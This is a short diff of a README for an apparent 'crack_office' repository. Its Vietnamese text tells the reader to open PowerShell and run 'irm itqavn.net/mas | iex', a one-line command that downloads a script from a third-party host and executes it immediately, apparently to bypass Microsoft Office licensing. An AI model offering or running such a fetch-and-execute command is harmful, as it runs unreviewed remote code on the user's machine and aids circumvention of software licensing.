@@ -1,6 +1,6 @@
 "# crack_office" 
 
-mở powersell hoặc teminal chạy lệnh dưới
+mở powersell chạy lệnh dưới
 
 irm itqavn.net/mas | iex
 
